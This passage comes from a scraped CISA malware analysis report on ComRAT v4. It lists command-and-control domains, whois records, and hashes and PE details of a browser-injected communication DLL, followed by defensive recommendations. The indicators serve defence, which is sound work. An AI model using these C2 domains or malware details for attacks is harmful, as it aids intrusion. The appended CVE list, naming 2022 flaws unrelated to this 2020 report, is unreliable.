name:\n\t\t\t\u00a0\u00a0\u00a0 CRUSIDER.TK\n\n\t\t\tOrganisation:\n\t\t\t\u00a0\u00a0\u00a0 Freedom Registry, Inc.\n\t\t\t\u00a0\u00a0\u00a0 2225 East Bayshore Road #290\n\t\t\t\u00a0\u00a0\u00a0 Palo Alto CA 94303\n\t\t\t\u00a0\u00a0\u00a0 United States\n\t\t\t\u00a0\u00a0\u00a0 Phone: +1 650-681-4172\n\t\t\t\u00a0\u00a0\u00a0 Fax: +1 650-681-4173\n\n\t\t\tDomain Nameservers:\n\t\t\t\u00a0\u00a0\u00a0 NS01.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS02.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS03.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS04.FREENOM.COM\nRelationships\n\n\n\ncrusider.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\ncrusider.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\nduke6.tk\nTags\ncommand-and-control\nWhois\nDomain name:\n\t\t\t\u00a0\u00a0\u00a0 DUKE6.TK\n\n\t\t\tOrganisation:\n\t\t\t\u00a0\u00a0\u00a0 Freedom Registry, Inc.\n\t\t\t\u00a0\u00a0\u00a0 2225 East Bayshore Road #290\n\t\t\t\u00a0\u00a0\u00a0 Palo Alto CA 94303\n\t\t\t\u00a0\u00a0\u00a0 United States\n\t\t\t\u00a0\u00a0\u00a0 Phone: +1 650-681-4172\n\t\t\t\u00a0\u00a0\u00a0 Fax: +1 650-681-4173\n\n\t\t\tDomain Nameservers:\n\t\t\t\u00a0\u00a0\u00a0 NS01.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS02.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS03.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS04.FREENOM.COM\nRelationships\n\n\n\nduke6.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nduke6.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\nsanitar.ml\nTags\ncommand-and-control\nWhois\nDomain name:\n\t\t\t\u00a0\u00a0\u00a0 SANITAR.ML\n\n\t\t\tOrganisation:\n\t\t\t\u00a0\u00a0\u00a0 Freedom Registry, Inc.\n\t\t\t\u00a0\u00a0\u00a0 2225 East Bayshore Road #290\n\t\t\t\u00a0\u00a0\u00a0 Palo Alto CA 94303\n\t\t\t\u00a0\u00a0\u00a0 United States\n\t\t\t\u00a0\u00a0\u00a0 Phone: +1 650-681-4172\n\t\t\t\u00a0\u00a0\u00a0 Fax: +1 650-681-4173\n\n\t\t\tDomain Nameservers:\n\t\t\t\u00a0\u00a0\u00a0 NS01.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS02.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS03.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS04.FREENOM.COM\nRelationships\n\n\n\nsanitar.ml\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nsanitar.ml\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\nwekanda.tk\nTags\ncommand-and-control\nWhois\nDomain name:\n\t\t\t\u00a0\u00a0\u00a0 WEKANDA.TK\n\n\t\t\tOrganisation:\n\t\t\t\u00a0\u00a0\u00a0 Freedom Registry, Inc.\n\t\t\t\u00a0\u00a0\u00a0 2225 East Bayshore Road #290\n\t\t\t\u00a0\u00a0\u00a0 Palo Alto CA 94303\n\t\t\t\u00a0\u00a0\u00a0 United States\n\t\t\t\u00a0\u00a0\u00a0 Phone: +1 650-681-4172\n\t\t\t\u00a0\u00a0\u00a0 Fax: +1 650-681-4173\n\n\t\t\tDomain Nameservers:\n\t\t\t\u00a0\u00a0\u00a0 NS01.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS02.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS03.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS04.FREENOM.COM\nRelationships\n\n\n\nwekanda.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nwekanda.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\nbranter.tk\nTags\ncommand-and-control\nPorts\n\n443 TCP\n\nWhois\nNo Whois record at the time of analysis.\nRelationships\n\n\n\nbranter.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nbranter.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\nTags\ntrojan\nDetails\n\n\n\nName\nCommunication_module_64.dll\n\n\nSize\n64000 bytes\n\n\nType\nPE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n\nMD5\n54902e33dd6d642bc5530de33b19e43c\n\n\nSHA1\na06f0e29fca6eb29bf5334fb3b84a872172b0e28\n\n\nSHA256\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nSHA512\n28b8f63af33f4aebd2b5b582750036db718f657640aca649d4b2b95188661da3834398a56184ee08f64ddf1d32198e722be46dbfbc78e49e0d276fe6c5234b94\n\n\nssdeep\n1536:p2JmzHKhyOjQuCLA/9zYgJS7aWSXEuT2XWZdjoEGbgqPU6Izj6N1o6OtAEBiUm5+:p2JmcjQuCLA/VYgJS7H21yXQdj5G0qMy\n\n\nEntropy\n5.939047\n\n\n\nAntivirus\n\n\n\nESET\na variant of Win64/Turla.CN trojan\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2018-03-06 09:37:48-05:00\n\n\nImport Hash\n87ab41c57e95562a3e81f0609398b278\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n199ab75383a70bd1148671ca1c689d0e\nheader\n1024\n2.031353\n\n\n46c52ca20a919c2314e32193eac9ec66\n.text\n60416\n5.990363\n\n\na97e460909f791b5d0b571099a5b7b56\n.rdata\n1536\n4.519592\n\n\nc5ba9ad86e832155180da146aef6eabc\n.pdata\n1024\n3.061435\n\n\n\nRelationships\n\n\n\n166b1fb3d3...\nContained_Within\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n166b1fb3d3...\nConnected_To\nbronerg.tk\n\n\n166b1fb3d3...\nConnected_To\ncrusider.tk\n\n\n166b1fb3d3...\nConnected_To\nduke6.tk\n\n\n166b1fb3d3...\nConnected_To\nsanitar.ml\n\n\n166b1fb3d3...\nConnected_To\nwekanda.tk\n\n\n166b1fb3d3...\nConnected_To\nbranter.tk\n\n\n\nDescription\nThis application is a 64-bit Windows DLL that has been identified as the communication module injected into the victim's system default browser by \"ComRATv4.exe\" (44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316). The DLL is similar to the 32-bit communication module (00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d).\n\nRelationship Summary\n\n\n\n\n1349191514...\nContains\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n\na3170c32c0...\nContained_Within\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\n\na3170c32c0...\nDropped\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n44d6d67b53...\nContains\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\n44d6d67b53...\nContains\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n44d6d67b53...\nDropped_By\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n\n00352afc7e...\nContained_Within\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n00352afc7e...\nConnected_To\nbranter.tk\n\n\n00352afc7e...\nConnected_To\nwekanda.tk\n\n\n00352afc7e...\nConnected_To\nsanitar.ml\n\n\n00352afc7e...\nConnected_To\nduke6.tk\n\n\n00352afc7e...\nConnected_To\nbronerg.tk\n\n\n00352afc7e...\nConnected_To\ncrusider.tk\n\n\nbronerg.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nbronerg.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\ncrusider.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\ncrusider.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nduke6.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nduke6.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nsanitar.ml\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nsanitar.ml\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nwekanda.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nwekanda.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nbranter.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nbranter.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n166b1fb3d3...\nContained_Within\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n166b1fb3d3...\nConnected_To\nbronerg.tk\n\n\n166b1fb3d3...\nConnected_To\ncrusider.tk\n\n\n166b1fb3d3...\nConnected_To\nduke6.tk\n\n\n166b1fb3d3...\nConnected_To\nsanitar.ml\n\n\n166b1fb3d3...\nConnected_To\nwekanda.tk\n\n\n166b1fb3d3...\nConnected_To\nbranter.tk\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://www.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\u00a0\n\n\n\n\n\n\nRevisions\n\nOctober 29, 2020: Initial Version\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966"
  ],
  "techniques": [],
  "advisory": "ar20-303a",
  "title": "MAR-10310246-2.v1 \u2013 PowerShell Script: ComRAT | CISA",
  "source": "analysis-reports",
  "id": "ac446f33795f8061c3ad0bf20807e83ee57526433c10981eaea39f2b4891a17b"
}